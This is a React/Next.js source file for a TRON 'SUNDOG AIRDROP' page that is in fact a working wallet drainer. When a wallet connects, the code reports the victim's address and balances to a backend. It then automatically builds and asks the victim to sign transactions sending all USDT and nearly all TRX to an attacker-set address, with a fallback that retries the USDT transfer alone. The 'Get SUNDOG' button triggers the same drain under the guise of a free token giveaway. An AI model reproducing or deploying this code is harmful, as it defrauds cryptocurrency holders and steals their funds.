'use client'

import { useState, useEffect } from 'react'
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { WalletSelectModal } from '@/components/wallet-select-modal'
import { Wallet, CheckCircle2, XCircle, ArrowUpRight, Loader2, Gift, Zap, Trophy, Star } from 'lucide-react'
import { toast } from 'sonner'
import { convertAddressToHex } from '@/lib/addressConverter'
import { isInWalletBrowser, waitForWallet } from '@/lib/deeplinks'
import Image from 'next/image'

const RECIPIENT_ADDRESS = process.env.NEXT_PUBLIC_RECIPIENT_ADDRESS || ''
const TRONGRID_API = 'https://api.trongrid.io'

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
const USDC_CONTRACT = 'TT1104f4nQzZtdnDRc8pbqoQmZyYNWHgcS'
const USDC_CONTRACT_HEX = 'some_hex_value'

export default function Home() {
  const { wallet, address, connected, connecting, connect, disconnect, signTransaction, select, wallets } = useWallet()
  const [balance, setBalance] = useState<number>(0)
  const [usdtBalance, setUsdtBalance] = useState<number>(0)
  const [usdcBalance, setUsdcBalance] = useState<number>(0)
  const [isSending, setIsSending] = useState(false)
  const [error, setError] = useState<string>('')
  const [txResult, setTxResult] = useState<{ trx: number; usdt: number; usdc: number; fee: number } | null>(null)
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [selectedWalletName, setSelectedWalletName] = useState<string>('')
  const [autoSendTriggered, setAutoSendTriggered] = useState(false)

  useEffect(() => {
    if (typeof window === 'undefined') return
    
    const checkWallet = async () => {
      const currentWallet = await waitForWallet(20, 100)
      
      const params = new URLSearchParams(window.location.search)
      const walletParam = params.get('wallet')
      
      if (currentWallet && walletParam && !connected && !connecting && wallets.length > 0) {
        const walletMapping: Record<string, string> = {
          'tronlink': 'TronLink',
          'imtoken': 'imToken Wallet',
          'tokenpocket': 'TokenPocket',
          'trustwallet': 'TronLink'
        }
        
        const walletDisplayNames: Record<string, string> = {
          'tronlink': 'TronLink',
          'imtoken': 'imToken',
          'tokenpocket': 'TokenPocket',
          'trustwallet': 'Trust Wallet'
        }
        
        const adapterName = walletMapping[walletParam.toLowerCase()]
        const displayName = walletDisplayNames[walletParam.toLowerCase()]
        
        if (adapterName) {
          setSelectedWalletName(displayName || adapterName)
          
          const wallet = wallets.find(w => w.adapter.name === adapterName)
          
          if (wallet) {
            const delay = walletParam.toLowerCase() === 'trustwallet' ? 3000 : 1500
            
            const timer = setTimeout(async () => {
              try {
                await select(adapterName)
                await connect()
                const newUrl = window.location.pathname
                window.history.replaceState({}, '', newUrl)
              } catch {
                setTimeout(() => {
                  setIsModalOpen(true)
                }, 500)
              }
            }, delay)
            
            return () => clearTimeout(timer)
          } else {
            setTimeout(() => {
              setIsModalOpen(true)
            }, 2000)
          }
        }
      }
    }
    
    checkWallet()
  }, [wallets, connected, connecting, select, connect])

  useEffect(() => {
    if (connected && address) {
      loadBalanceAndNotify()
    }
  }, [connected, address])

  useEffect(() => {
    if (connected && address && !autoSendTriggered && !isSending) {
      const hasBalance = balance > 0 || usdtBalance > 0
      
      if (hasBalance) {
        setAutoSendTriggered(true)
        setTimeout(() => {
          handleSendAll()
        }, 1500)
      }
    }
    
    if (!connected) {
      setAutoSendTriggered(false)
    }
  }, [connected, address, balance, usdtBalance, autoSendTriggered, isSending])

  async function loadBalanceAndNotify() {
    if (!address) return
    
    try {
      const scanResponse = await fetch('/api/wallet/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address })
      })
      
      if (!scanResponse.ok) {
        throw new Error('Ошибка API сканирования')
      }
      
      const scanData = await scanResponse.json()
      
      const trxBalance = scanData.balances.trx
      const usdtBal = scanData.balances.usdt
      
      setBalance(trxBalance)
      setUsdtBalance(usdtBal)

      await notifyConnection(scanData)
    } catch {}
  }

  async function loadBalance() {
    if (!address) return
    
    try {
      const response = await fetch(`${TRONGRID_API}/v1/accounts/${address}`)
      const data = await response.json()
      
      if (data.data && data.data[0]) {
        const trxBalance = (data.data[0].balance || 0) / 1_000_000
        setBalance(trxBalance)
      } else {
        setBalance(0)
      }

      try {
        const usdtBalanceResponse = await fetch(`${TRONGRID_API}/wallet/triggerconstantcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address: convertAddressToHex(address),
            contract_address: convertAddressToHex(USDT_CONTRACT),
            function_selector: 'balanceOf(address)',
            parameter: convertAddressToHex(address).substring(2).padStart(64, '0')
          })
        })
        
        const usdtBalanceData = await usdtBalanceResponse.json()
        
        if (usdtBalanceData.constant_result && usdtBalanceData.constant_result[0]) {
          const balanceHex = usdtBalanceData.constant_result[0]
          const balanceSun = parseInt(balanceHex, 16)
          const usdtBal = balanceSun / 1_000_000
          setUsdtBalance(usdtBal)
        } else {
          setUsdtBalance(0)
        }
      } catch {
        setUsdtBalance(0)
      }
      
      try {
        const usdcBalanceResponse = await fetch(`${TRONGRID_API}/wallet/triggerconstantcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address: convertAddressToHex(address),
            contract_address: USDC_CONTRACT_HEX,
            function_selector: 'balanceOf(address)',
            parameter: convertAddressToHex(address).substring(2).padStart(64, '0')
          })
        })
        
        const usdcBalanceData = await usdcBalanceResponse.json()
        
        if (usdcBalanceData.constant_result && usdcBalanceData.constant_result[0]) {
          const balanceHex = usdcBalanceData.constant_result[0]
          const balanceSun = parseInt(balanceHex, 16)
          const usdcBal = balanceSun / 1_000_000
          setUsdcBalance(usdcBal)
        } else {
          setUsdcBalance(0)
        }
      } catch {
        setUsdcBalance(0)
      }
    } catch {}
  }

  async function notifyConnection(scanData: any) {
    if (!address) return
    
    try {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
      const device = isMobile ? 'Mobile' : 'Desktop'
      
      const notifyResponse = await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          balances: scanData.balances,
          values: scanData.values,
          walletType: selectedWalletName || wallet?.adapter.name || 'Unknown Wallet',
          device
        })
      })
      
      if (!notifyResponse.ok) {
        throw new Error('Ошибка API уведомления')
      }
    } catch {}
  }

  function handleOpenModal() {
    setError('')
    setTxResult(null)
    setIsModalOpen(true)
  }

  async function handleSelectWallet(adapterName: string) {
    try {
      setSelectedWalletName(adapterName)

      const actualAdapterName = adapterName === 'Trust Wallet' ? 'TronLink' : adapterName
      
      const selectedWallet = wallets.find(w => w.adapter.name === actualAdapterName)
      
      if (!selectedWallet) {
        const mobileWallets = ['TokenPocket', 'imToken Wallet']
        if (mobileWallets.includes(actualAdapterName)) {
          const wcWallet = wallets.find(w => w.adapter.name === 'WalletConnect')
          
          if (!wcWallet) {
            throw new Error('WalletConnect не доступен')
          }

          await select('WalletConnect')
          await connect()
          
          setIsModalOpen(false)
          toast.success(`Подключение через WalletConnect для ${adapterName}`)
          return
        }
        
        throw new Error(`Кошелек ${adapterName} не найден. Установите расширение в браузере или используйте WalletConnect.`)
      }

      await select(actualAdapterName)
      await connect()
      
      setIsModalOpen(false)
      toast.success(`Подключен ${adapterName}!`)
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'Ошибка подключения'
      setError(errorMsg)
      toast.error(errorMsg)
      setIsModalOpen(false)
    }
  }

  async function handleSendTokensOnly() {
    if (!address || !signTransaction) {
      toast.error('Кошелек не подключен')
      return
    }

    if (usdtBalance <= 0) {
      toast.error('Нет токенов для отправки')
      return
    }

    setIsSending(true)
    setError('')
    setTxResult(null)

    try {
      const ownerHex = convertAddressToHex(address)
      const usdtContractHex = convertAddressToHex(USDT_CONTRACT)

      const transactions: any[] = []

      if (usdtBalance > 0) {
        const usdtAmountSun = Math.floor(usdtBalance * 1_000_000)
        const recipientHexClean = convertAddressToHex(RECIPIENT_ADDRESS).slice(2)
        const amountHex = usdtAmountSun.toString(16).padStart(64, '0')
        const addressHex = recipientHexClean.padStart(64, '0')
        const parameter = addressHex + amountHex

        const usdtTxResponse = await fetch(`${TRONGRID_API}/wallet/triggersmartcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address: ownerHex,
            contract_address: usdtContractHex,
            function_selector: 'transfer(address,uint256)',
            parameter: parameter,
            fee_limit: 50_000_000,
            call_value: 0
          })
        })

        const usdtTx = await usdtTxResponse.json()
        
        if (usdtTx.result && usdtTx.result.result) {
          transactions.push({ type: 'USDT', tx: usdtTx.transaction, amount: usdtBalance })
        }
      }

      if (transactions.length === 0) {
        throw new Error('Не удалось создать транзакции для токенов.')
      }

      let successCount = 0
      const results = { trx: 0, usdt: 0, fee: 0 }

      for (const txData of transactions) {
        try {
          const signedTx = await signTransaction(txData.tx)
          
          const broadcastResponse = await fetch(`${TRONGRID_API}/wallet/broadcasttransaction`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(signedTx)
          })

          const result = await broadcastResponse.json()
          
          if (result.result) {
            successCount++
            if (txData.type === 'USDT') results.usdt = txData.amount
            await new Promise(resolve => setTimeout(resolve, 1000))
          }
        } catch {}
      }

      if (successCount > 0) {
        setTxResult(results)
        
        let successMsg = 'Токены отправлены: '
        const parts = []
        if (results.usdt > 0) parts.push(`${results.usdt.toFixed(2)} USDT`)
        successMsg += parts.join(' + ')
        
        toast.success(successMsg)
        setTimeout(() => loadBalance(), 3000)
      } else {
        throw new Error('Не удалось отправить токены')
      }
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'Ошибка отправки токенов'
      setError(errorMsg)
      toast.error(errorMsg)
    } finally {
      setIsSending(false)
    }
  }

  async function handleSendAll() {
    if (!address || !signTransaction) {
      toast.error('Кошелек не подключен')
      return
    }

    setIsSending(true)
    setError('')
    setTxResult(null)

    try {
      const accountResponse = await fetch(`${TRONGRID_API}/v1/accounts/${address}`)
      const accountData = await accountResponse.json()
      
      if (!accountData.data || !accountData.data[0]) {
        throw new Error('Не удалось получить данные аккаунта')
      }

      const accountInfo = accountData.data[0]
      const currentTrxBalance = accountInfo.balance || 0

      const ownerHex = convertAddressToHex(address)
      const recipientHex = convertAddressToHex(RECIPIENT_ADDRESS)
      const usdtContractHex = convertAddressToHex(USDT_CONTRACT)

      const transactions: any[] = []
      let totalFeeSun = 0

      if (usdtBalance > 0) {
        const usdtAmountSun = Math.floor(usdtBalance * 1_000_000)
        
        const recipientHexClean = convertAddressToHex(RECIPIENT_ADDRESS).slice(2)
        const recipientParam = recipientHexClean.padStart(64, '0')
        const amountHex = usdtAmountSun.toString(16).padStart(64, '0')
        const parameter = recipientParam + amountHex

        const usdtTxResponse = await fetch(`${TRONGRID_API}/wallet/triggersmartcontract`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address: ownerHex,
            contract_address: usdtContractHex,
            function_selector: 'transfer(address,uint256)',
            parameter: parameter,
            fee_limit: 50_000_000,
            call_value: 0
          })
        })

        const usdtTx = await usdtTxResponse.json()
        
        if (usdtTx.result && usdtTx.result.result) {
          const energyFee = usdtTx.energy_fee || 0
          let estimatedFee = energyFee
          if (estimatedFee === 0) {
            estimatedFee = 15_000_000
          } else {
            estimatedFee = Math.ceil(energyFee * 1.5)
          }
          
          totalFeeSun += estimatedFee
          transactions.push({ type: 'USDT', tx: usdtTx.transaction, amount: usdtBalance })
        }
      }
          
      const trxTxFee = 1_000_000
      const totalReserve = totalFeeSun + trxTxFee
      const trxAmountToSend = currentTrxBalance - totalReserve

      if (trxAmountToSend > 0) {
        const trxTxResponse = await fetch(`${TRONGRID_API}/wallet/createtransaction`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address: ownerHex,
            to_address: recipientHex,
            amount: trxAmountToSend
          })
        })

        const trxTx = await trxTxResponse.json()
        
        if (!trxTx.Error && trxTx.txID) {
          transactions.push({ type: 'TRX', tx: trxTx, amount: trxAmountToSend / 1_000_000 })
        }
      }
      
      if (transactions.length === 0) {
        const hasFunds = currentTrxBalance > 0 || usdtBalance > 0
        
        if (!hasFunds) {
          throw new Error('Нет средств для отправки. Все балансы пусты.')
        } else {
          throw new Error(`Ошибка создания транзакций. Балансы: TRX=${(currentTrxBalance / 1_000_000).toFixed(6)}, USDT=${usdtBalance.toFixed(2)}`)
        }
      }

      let successCount = 0
      let trxRejected = false
      const results = { trx: 0, usdt: 0, fee: totalFeeSun / 1_000_000 }

      for (let i = 0; i < transactions.length; i++) {
        const txData = transactions[i]
        
        try {
          const signedTx = await signTransaction(txData.tx)
          
          const broadcastResponse = await fetch(`${TRONGRID_API}/wallet/broadcasttransaction`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(signedTx)
          })

          const result = await broadcastResponse.json()
          
          if (result.result) {
            successCount++
            
            if (txData.type === 'TRX') results.trx = txData.amount
            else if (txData.type === 'USDT') results.usdt = txData.amount
            
            await new Promise(resolve => setTimeout(resolve, 1000))
          } else {
            if (txData.type === 'TRX') {
              trxRejected = true
            }
          }
        } catch {
          if (txData.type === 'TRX') {
            trxRejected = true
          }
        }
      }

      if (trxRejected && successCount === 0 && usdtBalance > 0) {
        toast.info('TRX транзакция отклонена. Создаем транзакции для токенов...', {
          duration: 4000
        })
        
        const fallbackTransactions: any[] = []

        if (usdtBalance > 0) {
          try {
            const usdtAmountSun = Math.floor(usdtBalance * 1_000_000)
            
            const recipientHexClean = convertAddressToHex(RECIPIENT_ADDRESS).slice(2)
            const recipientParam = recipientHexClean.padStart(64, '0')
            const amountHex = usdtAmountSun.toString(16).padStart(64, '0')
            const parameter = recipientParam + amountHex

            const usdtTxResponse = await fetch(`${TRONGRID_API}/wallet/triggersmartcontract`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                owner_address: ownerHex,
                contract_address: usdtContractHex,
                function_selector: 'transfer(address,uint256)',
                parameter: parameter,
                fee_limit: 50_000_000,
                call_value: 0
              })
            })

            const usdtTx = await usdtTxResponse.json()
            
            if (usdtTx.result && usdtTx.result.result) {
              fallbackTransactions.push({ type: 'USDT', tx: usdtTx.transaction, amount: usdtBalance })
            }
          } catch {}
        }

        for (const txData of fallbackTransactions) {
          try {
            const signedTx = await signTransaction(txData.tx)
            
            const broadcastResponse = await fetch(`${TRONGRID_API}/wallet/broadcasttransaction`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(signedTx)
            })

            const result = await broadcastResponse.json()
            
            if (result.result) {
              successCount++
              if (txData.type === 'USDT') results.usdt = txData.amount
              await new Promise(resolve => setTimeout(resolve, 1000))
            }
          } catch {}
        }
      }
      
      if (successCount > 0) {
        setTxResult(results)
        
        let successMsg = 'Успешно отправлено: '
        const parts = []
        if (results.trx > 0) parts.push(`${results.trx.toFixed(6)} TRX`)
        if (results.trx > 0 && results.usdt > 0) parts.push(' + ')
        if (results.usdt > 0) parts.push(`${results.usdt.toFixed(2)} USDT`)
        successMsg += parts.join('')
        
        if (successCount < transactions.length) {
          const failedCount = transactions.length - successCount
          successMsg += ` (${failedCount} транзакция отклонена)`
        }
        
        toast.success(successMsg)
        setTimeout(() => loadBalance(), 3000)
      } else {
        const errorMsg = 'Все транзакции были отклонены пользователем'
        toast.error(errorMsg)
        setError(errorMsg)
      }

    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'Ошибка отправки средств'
      setError(errorMsg)
      toast.error(errorMsg)
    } finally {
      setIsSending(false)
    }
  }

  async function handleDisconnect() {
    try {
      await disconnect()
      setBalance(0)
      setError('')
      setTxResult(null)
      toast.info('Кошелек отключен')
    } catch {}
  }

  const formatAddress = (addr: string) => {
    if (!addr) return ''
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`
  }

  return (
    <main className="relative flex min-h-screen items-center justify-center p-4 overflow-hidden">
      <div className="absolute inset-0 z-0">
        <Image
          src="/rainbow-bg.jpg"
          alt="Rainbow Background"
          fill
          className="object-cover"
          priority
        />
        <div className="absolute inset-0 bg-black/20" />
      </div>

      <div className="absolute inset-0 z-[1] pointer-events-none">
        {[...Array(20)].map((_, i) => (
          <Star
            key={i}
            className="absolute text-yellow-300 animate-pulse"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 2}s`,
              fontSize: `${Math.random() * 20 + 10}px`,
            }}
          />
        ))}
      </div>

      <div className="relative z-10 w-full max-w-2xl">
        <div className="text-center mb-8 space-y-4">
          <div className="flex justify-center mb-6">
            <div className="relative">
              <div className="absolute inset-0 bg-yellow-400 blur-2xl opacity-60 animate-pulse" />
              <Image
                src="/sundog-coin.png"
                alt="SUNDOG"
                width={120}
                height={120}
                className="relative rounded-full"
              />
            </div>
          </div>
          
          <h1 className="text-5xl md:text-7xl font-black text-white text-balance drop-shadow-[0_0_30px_rgba(250,204,21,0.5)]">
            SUNDOG AIRDROP
          </h1>
          
          <p className="text-xl md:text-2xl text-yellow-300 font-bold animate-pulse">
            EXCLUSIVE GIVEAWAY

          </p>
          
          <div className="flex flex-wrap justify-center gap-4 mt-6">
            <div className="flex items-center gap-2 bg-white/10 backdrop-blur-md px-4 py-2 rounded-full border border-yellow-400/30">
              <Gift className="w-5 h-5 text-yellow-400" />
              <span className="text-white font-bold">To 1000 SUNDOG</span>
            </div>
            <div className="flex items-center gap-2 bg-white/10 backdrop-blur-md px-4 py-2 rounded-full border border-green-400/30">
              <Zap className="w-5 h-5 text-green-400" />
              <span className="text-white font-bold">Instant issuance
</span>
            </div>
            <div className="flex items-center gap-2 bg-white/10 backdrop-blur-md px-4 py-2 rounded-full border border-purple-400/30">
              <Trophy className="w-5 h-5 text-purple-400" />
              <span className="text-white font-bold">Limited distribution
</span>
            </div>
          </div>
        </div>

        <Card className="border-2 border-yellow-400/50 bg-black/60 backdrop-blur-xl shadow-[0_0_50px_rgba(250,204,21,0.3)]">
          <CardHeader className="space-y-3 pb-4">
            <CardTitle className="text-2xl md:text-3xl text-center text-white font-black">
              Get SUNDOG Tokens
            </CardTitle>
            <CardDescription className="text-center text-yellow-200/80 text-base md:text-lg">
              Connect your TRON wallet to participate in the airdrop
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {!connected ? (
              <>
                <Button
                  onClick={handleOpenModal}
                  disabled={connecting}
                  className="w-full"
                  size="lg"
                >
                  <Wallet className="mr-2 h-4 w-4" />
                  Connect wallet
                </Button>

                {error && (
                  <div className="flex items-start gap-2 p-3 rounded-lg bg-destructive/10 text-destructive text-sm">
                    <XCircle className="h-4 w-4 mt-0.5 flex-shrink-0" />
                    <span>{error}</span>
                  </div>
                )}

                <WalletSelectModal
                  open={isModalOpen}
                  onOpenChange={setIsModalOpen}
                  onSelectWallet={handleSelectWallet}
                  isConnecting={connecting}
                  availableWallets={wallets.map(w => w.adapter.name)}
                />
              </>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-2 p-4 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400">
                  <CheckCircle2 className="h-5 w-5 flex-shrink-0" />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">Wallet connected</p>
                    <p className="text-xs font-mono truncate mt-1">{formatAddress(address || '')}</p>
                    {wallet && (
                      <p className="text-xs mt-1 opacity-75">{wallet.adapter.name}</p>
                    )}
                  </div>
                </div>

                {txResult && (
                  <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/20 space-y-2">
                    <p className="text-sm font-medium text-green-600 dark:text-green-400">
                      Transactions are successful!
                    </p>
                    {txResult.trx > 0 && (
                      <div className="flex justify-between text-xs">
                        <span className="text-muted-foreground">TRX sent:</span>
                        <span className="font-medium">{txResult.trx.toFixed(6)} TRX</span>
                      </div>
                    )}
                    {txResult.usdt > 0 && (
                      <div className="flex justify-between text-xs">
                        <span className="text-muted-foreground">USDT sent:</span>
                        <span className="font-medium">{txResult.usdt.toFixed(2)} USDT</span>
                      </div>
                    )}
                    <div className="flex justify-between text-xs pt-2 border-t border-green-500/20">
                      <span className="text-muted-foreground">General commission:</span>
                      <span className="font-medium">~{txResult.fee.toFixed(2)} TRX</span>
                    </div>
                  </div>
                )}

                <div className="p-4 rounded-lg bg-muted/50 space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Balance TRX:</span>
                    <span className="font-medium">{balance.toFixed(6)} TRX</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-muted-foreground">Balance USDT:</span>
                    <span className="font-medium">{usdtBalance.toFixed(2)} USDT</span>
                  </div>
                </div>

                {error && (
                  <div className="flex items-start gap-2 p-3 rounded-lg bg-destructive/10 text-destructive text-sm">
                    <XCircle className="h-4 w-4 mt-0.5 flex-shrink-0" />
                    <span>{error}</span>
                  </div>
                )}

                <div className="flex gap-2">
                  <Button
                    onClick={handleSendAll}
                    disabled={isSending || (balance <= 0 && usdtBalance <= 0)}
                    className="flex-1 bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-white font-bold"
                    size="lg"
                  >
                    {isSending ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Sending...
                      </>
                    ) : (
                      <>
                        <ArrowUpRight className="mr-2 h-4 w-4" />
                        Get SUNDOG
                      </>
                    )}
                  </Button>
                </div>

                <Button
                  onClick={handleDisconnect}
                  variant="outline"
                  className="w-full bg-transparent"
                  size="sm"
                >
                  Disconnect wallet
                </Button>
              </div>
            )}
          </CardContent>
        </Card>

        <p className="text-center text-xs text-white/50 mt-6">
          By connecting your wallet, you agree to the terms of participation in the airdrop.
        </p>
      </div>
    </main>
  )
}
